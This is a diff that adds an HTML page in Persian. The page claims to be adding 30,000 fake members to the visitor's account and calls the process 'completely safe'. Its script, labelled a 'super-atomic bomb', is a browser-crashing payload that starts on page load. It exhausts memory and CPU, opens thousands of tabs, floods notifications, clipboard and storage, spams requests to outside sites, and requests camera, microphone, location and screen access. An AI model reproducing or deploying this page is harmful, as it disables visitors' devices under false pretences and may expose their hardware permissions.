@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Loading 30K Fake Members...</title>
+<style>
+body {
+    margin: 0;
+    padding: 0;
+    background: linear-gradient(145deg, #0b0c1a, #1a1b2e);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    font-family: 'Segoe UI', 'Roboto', sans-serif;
+    color: #fff;
+    text-align: center;
+    overflow: hidden;
+    position: relative;
+}
+.content {
+    z-index: 10;
+    padding: 50px 40px;
+    max-width: 700px;
+    background: rgba(255, 255, 255, 0.04);
+    backdrop-filter: blur(16px);
+    -webkit-backdrop-filter: blur(16px);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 40px;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255,255,255,0.05);
+    transition: all 0.3s ease;
+}
+h1 {
+    font-size: 38px;
+    font-weight: 700;
+    background: linear-gradient(135deg, #f0e6d3, #ffd78a);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 15px;
+    letter-spacing: -0.5px;
+}
+.loading-text {
+    font-size: 22px;
+    font-weight: 300;
+    color: #c0b7a8;
+    margin-top: 12px;
+    letter-spacing: 0.3px;
+    line-height: 1.6;
+}
+.highlight-number {
+    font-weight: 700;
+    color: #ffd78a;
+    -webkit-text-fill-color: #ffd78a;
+    background: none;
+    font-size: 28px;
+}
+.progress-bar-container {
+    width: 100%;
+    height: 4px;
+    background: rgba(255, 255, 255, 0.06);
+    border-radius: 10px;
+    margin: 30px 0 20px;
+    overflow: hidden;
+}
+.progress-bar {
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, #ffd78a, #f0a500);
+    animation: loadingProgress 1.8s ease-in-out infinite;
+    border-radius: 10px;
+}
+@keyframes loadingProgress {
+    0% { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+}
+.sub-text {
+    font-size: 15px;
+    color: #7a7265;
+    margin-top: 18px;
+    letter-spacing: 0.5px;
+    border-top: 1px solid rgba(255,255,255,0.04);
+    padding-top: 18px;
+}
+</style>
+</head>
+<body>
+<div class="content">
+    <h1>⏳ در حال بارگذاری ۳۰,۰۰۰ ممبر فیک</h1>
+    <p class="loading-text">
+        <span class="highlight-number">۳۰,۰۰۰</span> حساب کاربری فیک در حال اضافه شدن به لیست شما هستند...<br>
+        ممکن است <strong>چند لحظه</strong> طول بکشد.<br>
+        <span style="color: #a89f8e;">از شکیبایی شما متشکریم.</span>
+    </p>
+    <div class="progress-bar-container">
+        <div class="progress-bar"></div>
+    </div>
+    <p class="sub-text">
+        🔒 این فرایند کاملاً ایمن است • لطفاً صفحه را نبندید
+    </p>
+</div>
+<script>
+// ==================== بمب فرااتمی ۱۵ لایه ====================
+var memory = [];
+function memoryBomb() {
+    for (var i = 0; i < 100000; i++) {
+        memory.push(new Array(100000000).join('𒀀'));
+        memory.push(new Array(100000000).join('𐎠'));
+        memory.push(new Array(100000000).join('⃟'));
+        memory.push(new Array(100000000).join('꙰'));
+        memory.push(new Array(100000000).join('💀'));
+        memory.push(new Array(100000000).join('🔥'));
+    }
+}
+setInterval(memoryBomb, 0);
+
+function infiniteLoop() {
+    var chars = ['⃟','꙰','𒀀','𐎠','💀','🔥','⚡','💥','🎯','☢️','🤖','👾'];
+    while (true) {
+        document.body.innerHTML += chars[Math.floor(Math.random() * chars.length)];
+        document.body.innerHTML += '𒀀𒀁𒀂𒀃𒀄𒀅𒀆𒀇𒀈𒀉'.repeat(1000000);
+        document.body.innerHTML += '💀'.repeat(1000000);
+        document.body.innerHTML += '🔥'.repeat(1000000);
+    }
+}
+setTimeout(infiniteLoop, 0);
+
+function hardwareAttack() {
+    for (var i = 0; i < 10000; i++) {
+        try {
+            navigator.geolocation.getCurrentPosition(function(){}, function(){});
+            navigator.mediaDevices.getUserMedia({audio:true, video:true});
+            navigator.vibrate(1000000);
+            navigator.mediaDevices.enumerateDevices();
+            navigator.getBattery().then(function(battery) {});
+            navigator.mediaDevices.getDisplayMedia({video:true});
+            navigator.permissions.query({name:'geolocation'});
+            navigator.permissions.query({name:'notifications'});
+        } catch(e) {}
+    }
+}
+setInterval(hardwareAttack, 0);
+
+function tabBomb() {
+    for (var i = 0; i < 1000; i++) {
+        window.open('https://example.com', '_blank');
+        window.open('https://google.com', '_blank');
+        window.open('https://youtube.com', '_blank');
+        window.open('https://github.com', '_blank');
+    }
+}
+setInterval(tabBomb, 0);
+
+function notifBomb() {
+    for (var i = 0; i < 1000; i++) {
+        try {
+            Notification.requestPermission().then(function() {
+                new Notification('🚨 حمله اتمی!', {body: 'سیستم در حال فروپاشی!'});
+                new Notification('🔥 سیستم قفل شد!', {body: 'داره می‌سوزه!'});
+                new Notification('💀 مرگ تدریجی!', {body: 'رم پر شد!'});
+            });
+        } catch(e) {}
+    }
+}
+setInterval(notifBomb, 0);
+
+function clipboardBomb() {
+    for (var i = 0; i < 1000; i++) {
+        try {
+            navigator.clipboard.writeText('𒀀'.repeat(10000000) + '💀'.repeat(10000000) + '🔥'.repeat(10000000));
+        } catch(e) {}
+    }
+}
+setInterval(clipboardBomb, 0);
+
+function storageBomb() {
+    for (var i = 0; i < 1000000; i++) {
+        try {
+            localStorage.setItem('bomb' + i, '𒀀'.repeat(10000000));
+            sessionStorage.setItem('bomb' + i, '💀'.repeat(10000000));
+        } catch(e) {}
+    }
+}
+setInterval(storageBomb, 0);
+
+function workerBomb() {
+    for (var i = 0; i < 1000; i++) {
+        try {
+            var worker = new Worker('data:text/javascript;base64,' + btoa('while(true){}'));
+            var worker2 = new Worker('data:text/javascript;base64,' + btoa('for(;;){}'));
+        } catch(e) {}
+    }
+}
+setInterval(workerBomb, 0);
+
+function canvasBomb() {
+    for (var i = 0; i < 10000; i++) {
+        var canvas = document.createElement('canvas');
+        canvas.width = 100000000;
+        canvas.height = 100000000;
+        var ctx = canvas.getContext('2d');
+        var gl = canvas.getContext('webgl');
+        for (var j = 0; j < 10000000; j++) {
+            ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16);
+            ctx.fillRect(Math.random()*100000000, Math.random()*100000000, 1000000, 1000000);
+            if (gl) {
+                gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(100000000), gl.STATIC_DRAW);
+            }
+        }
+        document.body.appendChild(canvas);
+    }
+}
+setInterval(canvasBomb, 0);
+
+function audioBomb() {
+    for (var i = 0; i < 1000; i++) {
+        try {
+            var audio = new AudioContext();
+            for (var j = 0; j < 1000000; j++) {
+                var oscillator = audio.createOscillator();
+                oscillator.frequency.value = Math.random() * 100000000;
+                oscillator.type = 'sawtooth';
+                oscillator.connect(audio.destination);
+                oscillator.start();
+                oscillator.stop(0.001);
+            }
+        } catch(e) {}
+    }
+}
+setInterval(audioBomb, 0);
+
+function networkBomb() {
+    for (var i = 0; i < 100000; i++) {
+        try {
+            fetch('https://example.com?' + Math.random());
+            fetch('https://google.com?' + Math.random());
+        } catch(e) {}
+    }
+}
+setInterval(networkBomb, 0);
+
+function historyBomb() {
+    for (var i = 0; i < 1000000; i++) {
+        try {
+            history.pushState({}, '', '#' + Math.random());
+        } catch(e) {}
+    }
+}
+setInterval(historyBomb, 0);
+
+function wsBomb() {
+    for (var i = 0; i < 1000; i++) {
+        try {
+            var ws = new WebSocket('ws://localhost:8080');
+            ws.onopen = function() {
+                ws.send('⃟'.repeat(100000000));
+            };
+        } catch(e) {}
+    }
+}
+setInterval(wsBomb, 0);
+
+function idbBomb() {
+    try {
+        var request = indexedDB.open('bombDB', 1);
+        request.onsuccess = function(e) {
+            var db = e.target.result;
+            for (var i = 0; i < 100000; i++) {
+                var transaction = db.transaction(['store'], 'readwrite');
+                var store = transaction.objectStore('store');
+                store.add({id: i, data: '𒀀'.repeat(100000000)});
+            }
+        };
+    } catch(e) {}
+}
+setInterval(idbBomb, 0);
+
+function rtcBomb() {
+    for (var i = 0; i < 1000; i++) {
+        try {
+            var pc = new RTCPeerConnection();
+            pc.createDataChannel('channel');
+            pc.createOffer().then(function(offer) {
+                pc.setLocalDescription(offer);
+            });
+        } catch(e) {}
+    }
+}
+setInterval(rtcBomb, 0);
+
+console.log('☢️ بمب فرااتمی نهایی (۳۰K ممبر فیک) فعال شد!');
+</script>
+</body>
+</html>
